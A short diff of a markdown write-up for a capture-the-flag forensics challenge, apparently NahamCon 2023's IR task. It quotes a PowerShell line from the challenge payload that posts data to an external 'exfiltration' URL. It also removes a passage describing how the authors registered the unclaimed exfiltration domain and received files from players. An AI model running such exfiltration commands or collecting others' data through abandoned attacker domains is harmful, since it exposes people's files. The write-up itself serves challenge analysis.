@@ -15,13 +15,7 @@ At the second-last line, you can see the following piece of powershell code:
 
 ````ps
 Invoke-Webrequest -Method Post -Uri "https://www.thepowershellhacker.com/exfiltration" -Body $body
-```# How we hacked hundreds of CTF players
-
-## About the Challenge
-
-During the process of deobfuscating the powershell payload from [the IR challenge](2023/nahamcon/Forensics/IR/IR.md), we noticed that the domain where all the encrypted files were being sent to was not yet claimed. Here's an explanation of how we received hundreds of decryptable files the CTF players sent us by running the encrypter.
-
-## How we did it
+```
 
 ---
 
